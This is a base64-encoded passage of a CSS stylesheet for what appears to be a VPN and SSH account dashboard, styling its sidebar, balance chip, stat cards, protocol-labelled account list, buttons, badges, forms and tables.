udCk7IHRleHQtZGVjb3JhdGlvbjpub25lOyB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsgfQogICAgICAgIGE6aG92ZXIgeyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7IH0KCiAgICAgICAgLyog4pSA4pSAIExBWU9VVCDilIDilIAgKi8KICAgICAgICAubGF5b3V0IHsgZGlzcGxheTpmbGV4OyBtaW4taGVpZ2h0OiAxMDB2aDsgfQogICAgICAgIC5zaWRlYmFyIHsKICAgICAgICAgICAgd2lkdGg6IDI0MHB4OyBtaW4td2lkdGg6IDI0MHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1jYXJkKTsKICAgICAgICAgICAgYm9yZGVyLXJpZ2h0OiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBmbGV4LWRpcmVjdGlvbjpjb2x1bW47CiAgICAgICAgICAgIHBvc2l0aW9uOiBzdGlja3k7IHRvcDowOyBoZWlnaHQ6IDEwMHZoOwogICAgICAgICAgICBvdmVyZmxvdy15OiBhdXRvOwogICAgICAgIH0KICAgICAgICAubWFpbiB7IGZsZXg6MTsgcGFkZGluZzogMjhweCAzMnB4OyBvdmVyZmxvdy15OiBhdXRvOyBtYXgtd2lkdGg6IDEyMDBweDsgfQoKICAgICAgICAvKiDilIDilIAgU0lERUJBUiDilIDilIAgKi8KICAgICAgICAuc2lkZWJhci1icmFuZCB7CiAgICAgICAgICAgIGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBnYXA6IDEycHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggMThweCAxNnB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogOHB4OwogICAgICAgIH0KICAgICAgICAuc2lkZWJhci1icmFuZCBzdmcgeyBmbGV4LXNocmluazowOyB9CiAgICAgICAgLnNpZGViYXItYnJhbmQtdGV4dCB7IGxpbmUtaGVpZ2h0OjEuMzsgfQogICAgICAgIC5zaWRlYmFyLWJyYW5kLW5hbWUgeyBmb250LXNpemU6MWVtOyBmb250LXdlaWdodDo3MDA7IGNvbG9yOnZhcigtLXRleHQpOyBsZXR0ZXItc3BhY2luZzotLjJweDsgfQogICAgICAgIC5zaWRlYmFyLWJyYW5kLXZlciB7IGZvbnQtc2l6ZTouNjhlbTsgY29sb3I6dmFyKC0tbXV0ZWQpOyBmb250LXdlaWdodDo1MDA7IH0KICAgICAgICAKICAgICAgICAubmF2LWl0ZW0gewogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsgZ2FwOjEwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDEwcHggMTRweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZm9udC1zaXplOiAuODhlbTsgZm9udC13ZWlnaHQ6IDUwMDsgY29sb3I6IHZhcigtLXRleHQtZGltKTsKICAgICAgICAgICAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgICAgICAgfQogICAgICAgIC5uYXYtaXRlbTpob3ZlciwgLm5hdi1pdGVtLmFjdGl2ZSB7IGJhY2tncm91bmQ6IHJnYmEoOTksMTAyLDI0MSwuMTIpOyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7IH0KICAgICAgICAubmF2LWl0ZW0gLm5hdi1pY29uIHsgd2lkdGg6MThweDsgdGV4dC1hbGlnbjpjZW50ZXI7IGZvbnQtc2l6ZTouOTVlbTsgfQogICAgICAgIC5zaWRlYmFyLW5hdiB7IGRpc3BsYXk6ZmxleDsgZmxleC1kaXJlY3Rpb246Y29sdW1uOyBnYXA6MnB4OyBwYWRkaW5nOjAgOHB4OyBmbGV4OjE7IH0KICAgICAgICAuc2lkZWJhci1uYXYgYSB7CiAgICAgICAgICAgIGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBnYXA6MTBweDsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAxNHB4OyBib3JkZXItcmFkaXVzOiB2YXIoLS1yYWRpdXMtc20pOwogICAgICAgICAgICBmb250LXNpemU6IC44OGVtOyBmb250LXdlaWdodDogNTAwOyBjb2xvcjogdmFyKC0tdGV4dC1kaW0pOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICB9CiAgICAgICAgLnNpZGViYXItbmF2IGE6aG92ZXIsIC5zaWRlYmFyLW5hdiBhLmFjdGl2ZSB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoOTksMTAyLDI0MSwuMTIpOyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7CiAgICAgICAgfQogICAgICAgIC5zaWRlYmFyLW5hdiBhIC5uYXYtaWNvbiB7IHdpZHRoOjE4cHg7IHRleHQtYWxpZ246Y2VudGVyOyBmb250LXNpemU6Ljk1ZW07IH0KICAgICAgICAuc2lkZWJhci1mb290ZXIgewogICAgICAgICAgICBtYXJnaW4tdG9wOiBhdXRvOyBwYWRkaW5nOiAxMnB4IDE0cHg7CiAgICAgICAgICAgIGJvcmRlci10b3A6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGZsZXgtZGlyZWN0aW9uOmNvbHVtbjsgZ2FwOjRweDsKICAgICAgICB9CiAgICAgICAgLnNpZGViYXItZm9vdGVyIGEgewogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsgZ2FwOjEwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDhweCAxMnB4OyBib3JkZXItcmFkaXVzOiB2YXIoLS1yYWRpdXMtc20pOwogICAgICAgICAgICBmb250LXNpemU6IC44MmVtOyBmb250LXdlaWdodDogNTAwOyBjb2xvcjogdmFyKC0tdGV4dC1kaW0pOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICB9CiAgICAgICAgLnNpZGViYXItZm9vdGVyIGE6aG92ZXIgeyBiYWNrZ3JvdW5kOiByZ2JhKDk5LDEwMiwyNDEsLjA4KTsgY29sb3I6IHZhcigtLXRleHQpOyB9CiAgICAgICAgLnNpZGViYXItZm9vdGVyIC5sb2dvdXQtbGluayB7IGNvbG9yOiB2YXIoLS1kYW5nZXIpOyB9CiAgICAgICAgLnNpZGViYXItZm9vdGVyIC5sb2dvdXQtbGluazpob3ZlciB7IGJhY2tncm91bmQ6IHJnYmEoMjM5LDY4LDY4LC4xKTsgfQogICAgICAgIC5zaWRlYmFyLWRpdmlkZXIgeyBoZWlnaHQ6MXB4OyBiYWNrZ3JvdW5kOnZhcigtLWJvcmRlcik7IG1hcmdpbjo0cHggMTRweDsgfQoKICAgICAgICAvKiDilIDilIAgVE9QQkFSIOKUgOKUgCAqLwogICAgICAgIC50b3BiYXIgewogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDI4cHg7IGdhcDogMTZweDsKICAgICAgICB9CiAgICAgICAgLnRvcGJhciBoMSB7IGZvbnQtc2l6ZToxLjRlbTsgZm9udC13ZWlnaHQ6NzAwOyBsZXR0ZXItc3BhY2luZzotLjNweDsgfQogICAgICAgIC50b3BiYXItYWN0aW9ucyB7IGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBnYXA6IDEycHg7IH0KICAgICAgICAuc2FsZG8tY2hpcCB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMTYsMTg1LDEyOSwuMSk7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS1zdWNjZXNzKTsKICAgICAgICAgICAgcGFkZGluZzogNnB4IDE0cHg7IGJvcmRlci1yYWRpdXM6IDIwcHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTouODVlbTsgZm9udC13ZWlnaHQ6NjAwOwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDE2LDE4NSwxMjksLjIpOwogICAgICAgIH0KCiAgICAgICAgLyog4pSA4pSAIFNUQVRTIOKUgOKUgCAqLwogICAgICAgIC5zdGF0cyB7IGRpc3BsYXk6Z3JpZDsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiByZXBlYXQoYXV0by1maXQsIG1pbm1heCgyMDBweCwxZnIpKTsgZ2FwOiAxNnB4OyBtYXJnaW4tYm90dG9tOiAyOHB4OyB9CiAgICAgICAgLnN0YXQtY2FyZCB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWNhcmQpOwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiB2YXIoLS1yYWRpdXMpOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsgZ2FwOiAxNHB4OwogICAgICAgICAgICBib3gtc2hhZG93OiB2YXIoLS1zaGFkb3cpOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICB9CiAgICAgICAgLnN0YXQtY2FyZDpob3ZlciB7IGJvcmRlci1jb2xvcjogdmFyKC0tYm9yZGVyLWxpZ2h0KTsgYm94LXNoYWRvdzogdmFyKC0tc2hhZG93LWxnKTsgfQogICAgICAgIC5zdGF0LWljb24gewogICAgICAgICAgICB3aWR0aDo0MnB4OyBoZWlnaHQ6NDJweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBhbGlnbi1pdGVtczpjZW50ZXI7IGp1c3RpZnktY29udGVudDpjZW50ZXI7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OjcwMDsgZm9udC1zaXplOi44NWVtOyBmbGV4LXNocmluazowOwogICAgICAgIH0KICAgICAgICAuc3RhdC1pY29uLmJsdWUgeyBiYWNrZ3JvdW5kOiByZ2JhKDk5LDEwMiwyNDEsLjE1KTsgY29sb3I6IHZhcigtLXByaW1hcnkpOyB9CiAgICAgICAgLnN0YXQtaWNvbi5ncmVlbiB7IGJhY2tncm91bmQ6IHJnYmEoMTYsMTg1LDEyOSwuMTIpOyBjb2xvcjogdmFyKC0tc3VjY2Vzcyk7IH0KICAgICAgICAuc3RhdC1pY29uLmFtYmVyIHsgYmFja2dyb3VuZDogcmdiYSgyNDUsMTU4LDExLC4xMik7IGNvbG9yOiB2YXIoLS13YXJuaW5nKTsgfQogICAgICAgIC5zdGF0LWljb24ucHVycGxlIHsgYmFja2dyb3VuZDogcmdiYSgxMzksOTIsMjQ2LC4xMik7IGNvbG9yOiB2YXIoLS1wdXJwbGUpOyB9CiAgICAgICAgLnN0YXQtaW5mbyB7IGxpbmUtaGVpZ2h0OjEuMzsgfQogICAgICAgIC5zdGF0LXZhbCB7IGZvbnQtc2l6ZToxLjRlbTsgZm9udC13ZWlnaHQ6NzAwOyBsZXR0ZXItc3BhY2luZzotLjVweDsgfQogICAgICAgIC5zdGF0LWxhYmVsIHsgZm9udC1zaXplOi43NmVtOyBjb2xvcjogdmFyKC0tbXV0ZWQpOyBmb250LXdlaWdodDo1MDA7IH0KCiAgICAgICAgLyog4pSA4pSAIENBUkRTIOKUgOKUgCAqLwogICAgICAgIC5jYXJkIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogdmFyKC0tY2FyZCk7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cyk7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IHZhcigtLXNoYWRvdyk7CiAgICAgICAgICAgIG92ZXJmbG93OiBoaWRkZW47CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDI0cHg7CiAgICAgICAgfQogICAgICAgIC5jYXJkLWhlYWRlciB7CiAgICAgICAgICAgIGRpc3BsYXk6ZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjsKICAgICAgICAgICAgcGFkZGluZzogMTZweCAyMHB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0tYm9yZGVyLWxpZ2h0KTsKICAgICAgICAgICAgZ2FwOiAxMnB4OwogICAgICAgIH0KICAgICAgICAuY2FyZC10aXRsZSB7IGZvbnQtc2l6ZTogLjk1ZW07IGZvbnQtd2VpZ2h0OiA2MDA7IGNvbG9yOiB2YXIoLS10ZXh0KTsgfQogICAgICAgIC5jYXJkLWJvZHkgeyBwYWRkaW5nOiAyMHB4OyB9CgogICAgICAgIC8qIOKUgOKUgCBWUE4gQUNDT1VOVCBMSVNUIOKUgOKUgCAqLwogICAgICAgIC5ha3VuLWxpc3QgeyBkaXNwbGF5OmZsZXg7IGZsZXgtZGlyZWN0aW9uOmNvbHVtbjsgZ2FwOiAxcHg7IH0KICAgICAgICAuYWt1bi1pdGVtIHsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBhbGlnbi1pdGVtczpjZW50ZXI7IGp1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuOwogICAgICAgICAgICBwYWRkaW5nOiAxNHB4IDIwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWNhcmQpOwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICAgICAgZ2FwOiAxNnB4OwogICAgICAgICAgICBmbGV4LXdyYXA6IHdyYXA7CiAgICAgICAgfQogICAgICAgIC5ha3VuLWl0ZW06aG92ZXIgeyBiYWNrZ3JvdW5kOiB2YXIoLS1jYXJkLWhvdmVyKTsgfQogICAgICAgIC5ha3VuLWl0ZW06Zmlyc3QtY2hpbGQgeyBib3JkZXItcmFkaXVzOiB2YXIoLS1yYWRpdXMpIHZhcigtLXJhZGl1cykgMCAwOyB9CiAgICAgICAgLmFrdW4taXRlbTpsYXN0LWNoaWxkIHsgYm9yZGVyLXJhZGl1czogMCAwIHZhcigtLXJhZGl1cykgdmFyKC0tcmFkaXVzKTsgfQogICAgICAgIC5ha3VuLWluZm8geyBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsgZ2FwOiAxNHB4OyBtaW4td2lkdGg6IDA7IH0KICAgICAgICAuYWt1bi1pY29uIHsKICAgICAgICAgICAgd2lkdGg6IDQwcHg7IGhlaWdodDogNDBweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZGlzcGxheTpmbGV4OyBhbGlnbi1pdGVtczpjZW50ZXI7IGp1c3RpZnktY29udGVudDpjZW50ZXI7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogLjhlbTsgZm9udC13ZWlnaHQ6IDcwMDsgZmxleC1zaHJpbms6IDA7CiAgICAgICAgfQogICAgICAgIC5ha3VuLWljb24uc3NoIHsgYmFja2dyb3VuZDogcmdiYSg5OSwxMDIsMjQxLC4xNSk7IGNvbG9yOiB2YXIoLS1wcmltYXJ5KTsgfQogICAgICAgIC5ha3VuLWljb24udm1lc3MgeyBiYWNrZ3JvdW5kOiByZ2JhKDE2LDE4NSwxMjksLjEyKTsgY29sb3I6IHZhcigtLXN1Y2Nlc3MpOyB9CiAgICAgICAgLmFrdW4taWNvbi52bGVzcyB7IGJhY2tncm91bmQ6IHJnYmEoMjQ1LDE1OCwxMSwuMTIpOyBjb2xvcjogdmFyKC0td2FybmluZyk7IH0KICAgICAgICAuYWt1bi1pY29uLnRyb2phbiB7IGJhY2tncm91bmQ6IHJnYmEoMjM5LDY4LDY4LC4xKTsgY29sb3I6IHZhcigtLWRhbmdlcik7IH0KICAgICAgICAuYWt1bi1kZXRhaWwgeyBtaW4td2lkdGg6MDsgfQogICAgICAgIC5ha3VuLW5hbWUgeyBmb250LXdlaWdodDo2MDA7IGZvbnQtc2l6ZTouOTJlbTsgfQogICAgICAgIC5ha3VuLW1ldGEgeyBmb250LXNpemU6Ljc1ZW07IGNvbG9yOiB2YXIoLS1tdXRlZCk7IG1hcmdpbi10b3A6IDJweDsgZGlzcGxheTpmbGV4OyBnYXA6MTJweDsgZmxleC13cmFwOndyYXA7IH0KICAgICAgICAuYWt1bi1hY3Rpb25zIHsgZGlzcGxheTpmbGV4OyBnYXA6OHB4OyBhbGlnbi1pdGVtczpjZW50ZXI7IGZsZXgtc2hyaW5rOjA7IH0KCiAgICAgICAgLyog4pSA4pSAIEJVVFRPTlMg4pSA4pSAICovCiAgICAgICAgLmJ0biB7CiAgICAgICAgICAgIGRpc3BsYXk6aW5saW5lLWZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OmNlbnRlcjsgZ2FwOjZweDsKICAgICAgICAgICAgcGFkZGluZzogOXB4IDE4cHg7IGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgICAgICAgICAgIGZvbnQtc2l6ZTouODRlbTsgZm9udC13ZWlnaHQ6NjAwOyBsZXR0ZXItc3BhY2luZzouMnB4OwogICAgICAgICAgICBib3JkZXI6IG5vbmU7IGN1cnNvcjogcG9pbnRlcjsKICAgICAgICAgICAgdHJhbnNpdGlvbjogdmFyKC0tdHJhbnNpdGlvbik7CiAgICAgICAgICAgIHdoaXRlLXNwYWNlOm5vd3JhcDsKICAgICAgICB9CiAgICAgICAgLmJ0bi1wcmltYXJ5IHsgYmFja2dyb3VuZDogdmFyKC0tcHJpbWFyeSk7IGNvbG9yOiAjZmZmOyB9CiAgICAgICAgLmJ0bi1wcmltYXJ5OmhvdmVyIHsgYmFja2dyb3VuZDogdmFyKC0tcHJpbWFyeS1kaW0pOyBib3gtc2hhZG93OiAwIDRweCAxMnB4IHJnYmEoOTksMTAyLDI0MSwuMyk7IH0KICAgICAgICAuYnRuLWdyZWVuIHsgYmFja2dyb3VuZDogcmdiYSgxNiwxODUsMTI5LC4xNSk7IGNvbG9yOiB2YXIoLS1zdWNjZXNzKTsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgxNiwxODUsMTI5LC4yNSk7IH0KICAgICAgICAuYnRuLWdyZWVuOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSgxNiwxODUsMTI5LC4yNSk7IH0KICAgICAgICAuYnRuLXJlZCB7IGJhY2tncm91bmQ6IHJnYmEoMjM5LDY4LDY4LC4xKTsgY29sb3I6IHZhcigtLWRhbmdlcik7IGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjM5LDY4LDY4LC4yKTsgfQogICAgICAgIC5idG4tcmVkOmhvdmVyIHsgYmFja2dyb3VuZDogcmdiYSgyMzksNjgsNjgsLjIpOyB9CiAgICAgICAgLmJ0bi1vdXRsaW5lIHsgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7IGNvbG9yOiB2YXIoLS10ZXh0LWRpbSk7IGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7IH0KICAgICAgICAuYnRuLW91dGxpbmU6aG92ZXIgeyBib3JkZXItY29sb3I6IHZhcigtLXByaW1hcnkpOyBjb2xvcjogdmFyKC0tcHJpbWFyeSk7IH0KICAgICAgICAuYnRuLXNtIHsgcGFkZGluZzogNXB4IDEycHg7IGZvbnQtc2l6ZTouNzhlbTsgfQogICAgICAgIC5idG4teHMgeyBwYWRkaW5nOiAzcHggOHB4OyBmb250LXNpemU6LjdlbTsgYm9yZGVyLXJhZGl1czogNnB4OyB9CgogICAgICAgIC8qIOKUgOKUgCBCQURHRVMg4pSA4pSAICovCiAgICAgICAgLmJhZGdlIHsKICAgICAgICAgICAgZGlzcGxheTppbmxpbmUtZmxleDsgYWxpZ24taXRlbXM6Y2VudGVyOyBwYWRkaW5nOiAzcHggMTBweDsgYm9yZGVyLXJhZGl1czogMjBweDsKICAgICAgICAgICAgZm9udC1zaXplOi43ZW07IGZvbnQtd2VpZ2h0OjYwMDsgbGV0dGVyLXNwYWNpbmc6LjRweDsKICAgICAgICAgICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsgd2hpdGUtc3BhY2U6bm93cmFwOwogICAgICAgIH0KICAgICAgICAuYmFkZ2UtYWN0aXZlIHsgYmFja2dyb3VuZDogcmdiYSgxNiwxODUsMTI5LC4xMik7IGNvbG9yOiB2YXIoLS1zdWNjZXNzKTsgfQogICAgICAgIC5iYWRnZS1leHBpcmVkIHsgYmFja2dyb3VuZDogcmdiYSgyMzksNjgsNjgsLjEpOyBjb2xvcjogdmFyKC0tZGFuZ2VyKTsgfQogICAgICAgIC5iYWRnZS10cmlhbCB7IGJhY2tncm91bmQ6IHJnYmEoMjQ1LDE1OCwxMSwuMTIpOyBjb2xvcjogdmFyKC0td2FybmluZyk7IH0KICAgICAgICAuYmFkZ2UtaW5mbyB7IGJhY2tncm91bmQ6IHJnYmEoNTksMTMwLDI0NiwuMTIpOyBjb2xvcjogdmFyKC0taW5mbyk7IH0KCiAgICAgICAgLyog4pSA4pSAIEZPUk1TIOKUgOKUgCAqLwogICAgICAgIGlucHV0LCBzZWxlY3QsIHRleHRhcmVhIHsKICAgICAgICAgICAgd2lkdGg6MTAwJTsgcGFkZGluZzogMTBweCAxNHB4OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1iZyk7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWJvcmRlcik7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IHZhcigtLXJhZGl1cy1zbSk7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS10ZXh0KTsKICAgICAgICAgICAgZm9udC1zaXplOi45ZW07IGZvbnQtZmFtaWx5OiBpbmhlcml0OwogICAgICAgICAgICB0cmFuc2l0aW9uOiB2YXIoLS10cmFuc2l0aW9uKTsKICAgICAgICAgICAgb3V0bGluZTogbm9uZTsKICAgICAgICB9CiAgICAgICAgaW5wdXQ6Zm9jdXMsIHNlbGVjdDpmb2N1cywgdGV4dGFyZWE6Zm9jdXMgewogICAgICAgICAgICBib3JkZXItY29sb3I6IHZhcigtLXByaW1hcnkpOwogICAgICAgICAgICBib3gtc2hhZG93OiAwIDAgMCAzcHggcmdiYSg5OSwxMDIsMjQxLC4xMik7CiAgICAgICAgfQogICAgICAgIC5mb3JtLWdyb3VwIHsgbWFyZ2luLWJvdHRvbTogMTRweDsgfQogICAgICAgIGxhYmVsIHsKICAgICAgICAgICAgZGlzcGxheTpibG9jazsgbWFyZ2luLWJvdHRvbTogNXB4OwogICAgICAgICAgICBmb250LXNpemU6Ljc4ZW07IGZvbnQtd2VpZ2h0OjYwMDsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOwogICAgICAgICAgICBsZXR0ZXItc3BhY2luZzouNXB4OyBjb2xvcjogdmFyKC0tbXV0ZWQpOwogICAgICAgIH0KCiAgICAgICAgLyog4pSA4pSAIEVNUFRZIFNUQVRFIOKUgOKUgCAqLwogICAgICAgIC5lbXB0eS1zdGF0ZSB7CiAgICAgICAgICAgIHRleHQtYWxpZ246Y2VudGVyOyBwYWRkaW5nOiA0OHB4IDIwcHg7CiAgICAgICAgICAgIGNvbG9yOiB2YXIoLS1tdXRlZCk7CiAgICAgICAgfQogICAgICAgIC5lbXB0eS1zdGF0ZSAuaWNvbiB7IGZvbnQtc2l6ZToyLjVlbTsgbWFyZ2luLWJvdHRvbToxMnB4OyBvcGFjaXR5Oi40OyB9CiAgICAgICAgLmVtcHR5LXN0YXRlIGgzIHsgZm9udC1zaXplOjFlbTsgZm9udC13ZWlnaHQ6NjAwOyBjb2xvcjogdmFyKC0tdGV4dC1kaW0pOyBtYXJnaW4tYm90dG9tOiA2cHg7IH0KICAgICAgICAuZW1wdHktc3RhdGUgcCB7IGZvbnQtc2l6ZTouODVlbTsgbWFyZ2luLWJvdHRvbTogMjBweDsgfQoKICAgICAgICAvKiDilIDilIAgQUxFUlRTIOKUgOKUgCAqLwogICAgICAgIC5hbGVydCB7CiAgICAgICAgICAgIHBhZGRpbmc6IDEycHggMTZweDsgYm9yZGVyLXJhZGl1czogdmFyKC0tcmFkaXVzLXNtKTsKICAgICAgICAgICAgZm9udC1zaXplOi44NWVtOyBmb250LXdlaWdodDo1MDA7IG1hcmdpbi1ib3R0b206MTZweDsKICAgICAgICB9CiAgICAgICAgLmFsZXJ0LXN1Y2Nlc3MgeyBiYWNrZ3JvdW5kOiByZ2JhKDE2LDE4NSwxMjksLjEpOyBjb2xvcjogdmFyKC0tc3VjY2Vzcyk7IGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMTYsMTg1LDEyOSwuMik7IH0KICAgICAgICAuYWxlcnQtZXJyb3IgeyBiYWNrZ3JvdW5kOiByZ2JhKDIzOSw2OCw2OCwuMDgpOyBjb2xvcjogdmFyKC0tZGFuZ2VyKTsgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyMzksNjgsNjgsLjE1KTsgfQogICAgICAgIC5hbGVydC1pbmZvIHsgYmFja2dyb3VuZDogcmdiYSg1OSwxMzAsMjQ2LC4wOCk7IGNvbG9yOiB2YXIoLS1pbmZvKTsgYm9yZGVyOiAxcHggc29saWQgcmdiYSg1OSwxMzAsMjQ2LC4xNSk7IH0KCiAgICAgICAgLyog4pSA4pSAIFRBQkxFIOKUgOKUgCAqLwogICAgICAgIC50YWJsZS13cmFwIHsgb3ZlcmZsb3cteDphdXRvOyB9CiAgICAgICAgdGFibGUgeyB3aWR0aDoxMDAlOyBib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7IGZvbnQtc2l6ZTouODhlbTsgfQogICAgICAgIHRoIHsKICAgICAgICAgICAgdGV4dC1hbGlnbjpsZWZ0OyBwYWRkaW5nOiAxMnB4IDE2cHg7CiAgICAgICAgICAgIGZvbnQtc2l6ZTouNzJlbTsgZm9udC13ZWlnaHQ6NjAwOyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOi42cHg7IGNvbG9yOiB2YXIoLS1tdXRlZCk7CiAgICAgICAgICAgIGJvcmRlci1ib3R0b206IDJweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwogICAgICAgICAgICB3aGl0ZS1zcGFjZTpub3dyYXA7CiAgICAgICAgfQogICAgICAgIHRkIHsgcGFkZGluZzogMTJweCAxNnB4OyBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgY29sb3I6IHZhcigtLXRleHQtZGltKTsgfQogICAgICAgIHRyOmhvdmVyIHRkIHsgYmFja2dyb3VuZDogcmdiYSg5OSwxMDIsMjQxLC4wMyk7IH0KCiAgICAgICAgLyog4pSA4pSAIFJFU1BPTlNJVkUg4pSA4pSAICovCiAgICAgICAgCiAgICAgICAgLnRleHQtY2VudGVyIHsgdGV4dC1hbGlnbjpjZW50ZXI7IH0KICAgICAgICAudGV4dC1yaWdodCB7IHRleHQtYWxpZ246cmlnaHQ7IH0KICAgICAgICAudGV4dC1tdXRlZCB7IGNvbG9yOiB2YXIoLS1tdXRlZCk7IH0KICAgICAgICAudGV4dC1zdWNjZXNzIHsgY29sb3I6IHZhcigtLXN1Y2Nlc3MpOyB9CiAgICAgICAgLnRleHQtZGFuZ2VyIHsgY29sb3I6IHZhcigtLWRhbmdlcik7IH0KICAgICAgICAuZmxleCB7IGRpc3BsYXk6ZmxleDsgfQogICAgICAgIC5mbGV4LWJldHdlZW4geyBkaXNwbGF5OmZsZXg7IGFsaWduLWl0ZW1zOmNlbnRlcjsganVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47IH0KICAgICAgICAuZ2FwLXNtIHsgZ2FwOiA4cHg7IH0KICAgICAgICAuZ2FwLW1kIHsgZ2FwOiAxNnB4OyB9CiAgICAgICAgLm10LTEgeyBtYXJnaW4tdG9wOiA4cHg7IH0KICAgICAgICAubXQtMiB7IG1hcmdpbi10b3A6IDE2cHg7IH0KICAgICAgICAubWItMSB7IG1hcmdpbi1ib3R0b206IDhweDsgfQogICAgICAgIC5tYi0yIHsgbWFyZ2luLWJvdHRvbTogMTZweDsgfQogICAgICAgIC53LWZ1bGwgeyB3aWR0aDoxMDAlOyB9CiAgICAgICAgQG1lZGlhKG1heC13aWR0aDo3NjhweCkgewogICAgICAgICAgICAubGF5b3V0IHsgZmxleC1kaXJlY3Rpb246Y29sdW1uOyB9CiAgICAgICAgICAgIC5zaWRlYmFyIHsgd2lkdGg6MTAwJTsgbWluLXdpZHRoOjEwMCU7IGhlaWdodDphdXRvOyBwb3NpdGlvbjpzdGF0aWM7IGJvcmRlci1yaWdodDpub25lOyBib3JkZXItYm90dG9tOjFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOyBtYXgtaGVpZ2h0OjQ1dmg7IH0KICAgICAgICAgICAgLm1haW4geyBwYWRkaW5nOiAyMHB4IDE2cHg7IH0KICAgICAgICAgICAgLnN0YXRzIHsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAxZnIgMWZyOyB9CiAgI